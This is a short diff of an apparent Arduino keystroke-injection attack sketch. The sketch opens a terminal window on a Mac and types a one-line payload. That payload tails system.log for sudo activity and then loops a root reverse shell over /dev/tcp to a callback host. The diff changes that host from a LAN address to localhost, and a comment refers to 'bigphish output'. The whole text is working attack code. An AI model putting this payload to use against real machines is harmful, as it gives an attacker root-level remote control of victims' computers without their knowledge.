@@ -57,7 +57,7 @@ void setup ()
   cmd(KEY_N);
   //open a new window
   delay(1000);
-  Keyboard.println("tail -F -n 0 /var/log/system.log | grep --line-buffered sudo | while read ; do while true; do sudo bash -i >& /dev/tcp/192.168.2.12/8080 0>&1; done; done");
+  Keyboard.println("tail -F -n 0 /var/log/system.log | grep --line-buffered sudo | while read ; do while true; do sudo bash -i >& /dev/tcp/127.0.0.1/8080 0>&1; done; done");
   //configured for localhost callback on 8080; modify with bigphish output
   delay(10);
   cmd(KEY_M);
